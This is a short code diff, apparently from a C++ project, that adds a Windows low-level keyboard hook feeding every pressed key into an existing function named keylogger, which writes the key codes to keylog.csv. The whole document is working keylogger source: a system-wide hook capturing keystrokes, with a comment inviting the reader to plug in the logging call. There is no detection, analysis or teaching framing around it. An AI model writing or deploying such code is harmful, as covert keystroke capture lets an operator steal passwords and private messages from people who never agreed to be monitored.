@@ -94,3 +94,20 @@ void keylogger(int keyAscii, char* filename)
     }
     fclose(OUTPUT_FILE);
 }
+
+
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+    if (nCode == HC_ACTION)
+    {
+        KBDLLHOOKSTRUCT* pKeyboardHook = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
+        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
+        {
+            int keyAscii = pKeyboardHook->vkCode;
+            // Call your logging function here with the keyAscii value
+            keylogger(keyAscii, "keylog.csv");
+        }
+    }
+
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
